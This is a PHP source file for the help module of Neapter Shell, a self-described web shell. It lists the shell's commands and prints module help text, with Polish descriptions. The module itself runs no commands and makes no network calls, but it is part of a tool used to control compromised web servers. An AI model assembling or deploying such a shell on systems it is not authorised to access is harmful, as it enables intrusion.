<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Show list of all available commands and help
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleHelp extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('help');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
help - Wyświetlanie pomocy

    Użycie:
        help
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        $aModulesCommands = array();

        /**
         * Get all commands assigned to module
         *
         * cat - Show file contents
         * cp, copy - Copy file/directory
         */
        foreach ($this->oUtils->getCommands() as $sCmd => $sClass) {
            if (!isset($aModulesCommands[$sClass])) {
                $aModulesCommands[$sClass] = '';
            }

            $aModulesCommands[$sClass] .= $sCmd . ', ';
        }

        $aModulesCommands = array_map(
            create_function('$a', 'return substr($a, 0, -2);'),
            $aModulesCommands
        );

        ksort($aModulesCommands);

        $iMaxLen = 0;

        /**
         * Find the longest commands line
         */
        foreach ($aModulesCommands as $sModuleCmd) {
            if (($iLen = strlen($sModuleCmd)) > $iMaxLen) {
                $iMaxLen = $iLen;
            }
        }

        $sOutput = '';

        /**
         * Prepare commands line and header of each module
         */
        foreach ($aModulesCommands as $sModule => $sModuleCmd) {
            $sHelp = $sModule::getHelp();

            if (($iHeaderPos = strpos($sHelp, "\n")) === false) {
                $iHeaderPos = strlen($sHelp);
            }

            $sHeader = trim(substr($sHelp, 0, $iHeaderPos));

            $sOutput .= sprintf(
                "%-{$iMaxLen}s - %s\r\n",
                $sModuleCmd,
                $sHeader
            );
        }

        /**
         * Details help
         */
        if ($this->oArgs->getParam(0) === 'all') {
            $sOutput .= "\r\n\r\n" . str_repeat('=', 80) . "\r\n\r\n";
            foreach ($aModulesCommands as $sModule => $sModuleCmd) {
                $sHelp = $sModule::getHelp();

                $sOutput .= sprintf(">>>>> Module: %s <<<<<\r\n", $sModule);
                $sOutput .= sprintf("%s - %s\r\n\r\n\r\n", $sModuleCmd, $sHelp);
            }
        }

        return htmlspecialchars(substr($sOutput, 0, -6));
    }
}
